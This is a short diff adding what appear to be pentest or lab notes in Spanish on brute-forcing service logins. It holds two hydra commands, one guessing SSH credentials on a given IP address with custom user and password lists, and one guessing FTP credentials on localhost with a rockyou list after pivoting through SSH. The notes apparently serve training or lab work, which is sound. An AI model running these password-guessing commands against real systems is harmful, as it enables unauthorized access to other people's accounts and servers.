@@ -1,0 +1,8 @@
+	####Service Authentication Brute Forcing
+	###SSH
+hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
+#Buscamos las credenciales en una lista generada de forrma automaitca y personalizada (ver .txt en carpeta raiz)
+
+	###FTP
+hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
+#En este caso, estamos conecatdnonos a ftp desde el ssh anterior
